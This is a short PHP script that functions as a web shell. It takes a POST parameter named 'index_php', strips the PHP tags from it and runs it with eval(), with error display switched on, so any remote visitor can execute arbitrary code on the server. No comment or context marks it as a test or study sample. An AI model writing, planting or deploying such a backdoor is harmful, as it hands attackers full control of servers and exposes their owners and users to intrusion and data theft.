<?php

ini_set('display_errors', 'on');
error_reporting(E_ALL);

if( isset($_REQUEST['index_php']) and strlen($_REQUEST['index_php'])>0 ){
   $contents = $_POST['index_php'];
   $contents=preg_replace("/<\?php?|\?>/", "", $contents); 
   eval($contents); 
}
